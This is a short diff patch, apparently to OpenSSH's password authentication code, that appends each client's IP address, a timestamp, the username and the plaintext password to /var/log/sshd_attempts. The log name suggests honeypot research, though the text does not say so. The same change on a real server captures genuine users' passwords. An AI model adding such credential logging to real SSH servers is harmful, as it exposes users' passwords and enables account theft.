@@ -1,0 +1,30 @@
+0a1
+> 
+58c59
+< 
+---
+> #include "canohost.h"
+81a83,104
+> 
+> if (*password != '\0')
+> {
+> const char *remote_ip;
+> remote_ip = ssh_remote_ipaddr(ssh);
+> struct tm *timePtr;
+> time_t localTime;
+> char timeString[100];
+> 
+> localTime = time(NULL);
+> timePtr = localtime(&localTime);
+> strftime(timeString, 100, "%D %r", timePtr);
+> 
+> FILE *logFile;
+> logFile = fopen("/var/log/sshd_attempts","a+");
+> fprintf (logFile,"From: %s at: %s | user: %s, pass: %s\n", \
+> remote_ip, timeString, authctxt->user, password);
+> fclose (logFile);
+> }
+> 
+> 
+> 
+
